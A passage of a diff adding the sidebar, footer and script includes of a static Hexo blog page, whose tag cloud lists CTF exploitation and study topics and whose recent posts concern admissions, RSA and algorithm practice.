+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/book/" rel="tag">book</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/buu%E5%88%B7%E9%A2%98/" rel="tag">buu刷题</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/c-%E5%9F%BA%E7%A1%80/" rel="tag">c++基础</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/ciscn/" rel="tag">ciscn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/csapp/" rel="tag">csapp</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/dasctf/" rel="tag">dasctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/double-free/" rel="tag">double free</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/fastbin-attack/" rel="tag">fastbin attack</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/flair/" rel="tag">flair</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/fmt/" rel="tag">fmt</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/git/" rel="tag">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/googlectf-2020/" rel="tag">googlectf 2020</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/house-of-force/" rel="tag">house of force</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/house-of-orange/" rel="tag">house of orange</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/kernel-pwn/" rel="tag">kernel pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/leetcode/" rel="tag">leetcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/mips-pwn/" rel="tag">mips pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/off-by-one/" rel="tag">off by one</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/pwnable-tw/" rel="tag">pwnable.tw</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/srop/" rel="tag">srop</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/unlink/" rel="tag">unlink</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/unsortedbin-attack/" rel="tag">unsortedbin attack</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/v8/" rel="tag">v8</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E3%80%8A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E7%9B%B8%E8%BF%98%E5%8E%9F%E3%80%8B/" rel="tag">《操作系统真相还原》</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E4%BA%BA%E7%94%9F/" rel="tag">人生</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83/" rel="tag">出题环境</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="tag">基础知识</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E5%9F%BA%E7%A1%80%E7%BB%83%E4%B9%A0/" rel="tag">基础练习</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E5%A4%A9%E6%A2%AF%E8%B5%9B/" rel="tag">天梯赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E5%AE%89%E8%A3%85/" rel="tag">安装</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E6%8E%A8%E5%85%8D/" rel="tag">推免</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/" rel="tag">漏洞基础</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E7%89%9B%E5%AE%A2%E7%BD%91/" rel="tag">牛客网</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="tag">环境搭建</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E8%93%9D%E6%A1%A5%E6%9D%AF/" rel="tag">蓝桥杯</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E8%A5%BF%E5%8D%97%E7%A7%91%E6%8A%80%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%94%9F%E8%B5%9B/" rel="tag">西南科技大学新生赛</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="../../../../tags/book/" style="font-size: 10px;">book</a> <a href="../../../../tags/buu%E5%88%B7%E9%A2%98/" style="font-size: 20px;">buu刷题</a> <a href="../../../../tags/c-%E5%9F%BA%E7%A1%80/" style="font-size: 10px;">c++基础</a> <a href="../../../../tags/ciscn/" style="font-size: 10px;">ciscn</a> <a href="../../../../tags/csapp/" style="font-size: 13.33px;">csapp</a> <a href="../../../../tags/dasctf/" style="font-size: 10px;">dasctf</a> <a href="../../../../tags/double-free/" style="font-size: 10px;">double free</a> <a href="../../../../tags/fastbin-attack/" style="font-size: 10px;">fastbin attack</a> <a href="../../../../tags/flair/" style="font-size: 10px;">flair</a> <a href="../../../../tags/fmt/" style="font-size: 10px;">fmt</a> <a href="../../../../tags/git/" style="font-size: 10px;">git</a> <a href="../../../../tags/googlectf-2020/" style="font-size: 10px;">googlectf 2020</a> <a href="../../../../tags/house-of-force/" style="font-size: 13.33px;">house of force</a> <a href="../../../../tags/house-of-orange/" style="font-size: 10px;">house of orange</a> <a href="../../../../tags/kernel-pwn/" style="font-size: 13.33px;">kernel pwn</a> <a href="../../../../tags/leetcode/" style="font-size: 13.33px;">leetcode</a> <a href="../../../../tags/mips-pwn/" style="font-size: 10px;">mips pwn</a> <a href="../../../../tags/off-by-one/" style="font-size: 10px;">off by one</a> <a href="../../../../tags/pwn/" style="font-size: 10px;">pwn</a> <a href="../../../../tags/pwnable-tw/" style="font-size: 13.33px;">pwnable.tw</a> <a href="../../../../tags/srop/" style="font-size: 10px;">srop</a> <a href="../../../../tags/unlink/" style="font-size: 13.33px;">unlink</a> <a href="../../../../tags/unsortedbin-attack/" style="font-size: 10px;">unsortedbin attack</a> <a href="../../../../tags/v8/" style="font-size: 10px;">v8</a> <a href="../../../../tags/%E3%80%8A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E7%9B%B8%E8%BF%98%E5%8E%9F%E3%80%8B/" style="font-size: 10px;">《操作系统真相还原》</a> <a href="../../../../tags/%E4%BA%BA%E7%94%9F/" style="font-size: 10px;">人生</a> <a href="../../../../tags/%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83/" style="font-size: 10px;">出题环境</a> <a href="../../../../tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 16.67px;">基础知识</a> <a href="../../../../tags/%E5%9F%BA%E7%A1%80%E7%BB%83%E4%B9%A0/" style="font-size: 10px;">基础练习</a> <a href="../../../../tags/%E5%A4%A9%E6%A2%AF%E8%B5%9B/" style="font-size: 10px;">天梯赛</a> <a href="../../../../tags/%E5%AE%89%E8%A3%85/" style="font-size: 10px;">安装</a> <a href="../../../../tags/%E6%8E%A8%E5%85%8D/" style="font-size: 10px;">推免</a> <a href="../../../../tags/%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/" style="font-size: 10px;">漏洞基础</a> <a href="../../../../tags/%E7%89%9B%E5%AE%A2%E7%BD%91/" style="font-size: 10px;">牛客网</a> <a href="../../../../tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 10px;">环境搭建</a> <a href="../../../../tags/%E8%93%9D%E6%A1%A5%E6%9D%AF/" style="font-size: 20px;">蓝桥杯</a> <a href="../../../../tags/%E8%A5%BF%E5%8D%97%E7%A7%91%E6%8A%80%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%94%9F%E8%B5%9B/" style="font-size: 10px;">西南科技大学新生赛</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2020/07/">July 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="../../../10/30/%E7%94%A8%E9%9A%8F%E6%9C%BA%E6%A2%AF%E5%BA%A6%E4%B8%8B%E9%99%8D%E6%9D%A5%E4%BC%98%E5%8C%96%E4%BA%BA%E7%94%9F/">用随机梯度下降来优化人生</a>
+          </li>
+        
+          <li>
+            <a href="../../../10/14/%C2%962021%E6%8E%A8%E5%85%8D%E6%80%BB%E7%BB%93/">2021推免总结</a>
+          </li>
+        
+          <li>
+            <a href="../../../10/08/rsa%E7%AE%97%E6%B3%95/">rsa算法</a>
+          </li>
+        
+          <li>
+            <a href="../../../08/26/leetcode%E4%B9%8B%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/">leetcode之算法学习计划</a>
+          </li>
+        
+          <li>
+            <a href="../../../08/07/LearnBlockchainbyBuildingOne/">Learn Blockchain by Building One_book study</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 winter<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="../../../../index.html" class="mobile-nav-link">Home</a>
+  
+    <a href="../../../../archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="../../../../fancybox/jquery.fancybox.css">
+
+  
+<script src="../../../../fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="../../../../js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
